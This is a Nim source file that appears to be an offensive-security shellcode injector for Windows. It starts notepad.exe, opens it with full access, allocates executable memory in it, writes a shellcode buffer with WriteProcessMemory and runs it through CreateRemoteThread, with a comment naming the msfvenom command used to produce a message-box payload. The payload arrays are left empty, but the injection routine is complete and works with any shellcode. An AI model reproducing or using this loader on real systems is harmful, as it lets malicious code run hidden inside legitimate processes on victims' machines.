import winim
import osproc

proc injectCreateRemoteThread[I, T](shellcode: array[I, T]): void =

    #[
        #Can't seem to get CreateProcess to work with Winim... More time needed to figure out whats going on.

        var tProcess: LPPROCESS_INFORMATION
        var sInfo: LPSTARTUPINFOW

        CreateProcess(
            r"C:\Windows\notepad.exe",
            nil,
            nil,
            nil,
            false,
            0,
            nil,
            nil,
            sInfo,
            tProcess
        )
    ]#

    var tProcess = startProcess("notepad.exe")

    echo "target process: ", tProcess.processID

    var pHandle = OpenProcess(
        PROCESS_ALL_ACCESS, 
        false, 
        cast[DWORD](tProcess.processID)
    )

    echo "pHandle: ", pHandle

    var rPtr = VirtualAllocEx(
        pHandle,
        nil,
        cast[SIZE_T](len(shellcode)),
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    )

    var bytesWritten: SIZE_T
    var wSuccess = WriteProcessMemory(
        pHandle, 
        rPtr,
        unsafeAddr shellcode,
        cast[SIZE_T](len(shellcode)),
        addr bytesWritten
    )

    echo "WriteProcessMemory: ", wSuccess
    echo "bytes written: ", bytesWritten

    var tHandle = CreateRemoteThread(
        pHandle, 
        nil,
        0,
        cast[LPTHREAD_START_ROUTINE](rPtr),
        nil, 
        0, 
        nil
    )

    echo "tHandle: ", tHandle
    echo "Injected"

# ./msfvenom -p windows/x64/messagebox -f csharp
var buf86 : array[272, int] = [
 ];

var buf64: array[295, int] = [
 ]

var x64: bool = true 
when defined x86:
    echo "Running in x86 process"
    x64 = false
elif defined x64:
    echo "Running on x64 process"

if x64 == true:
    injectCreateRemoteThread(buf64)
else:
    injectCreateRemoteThread(buf86)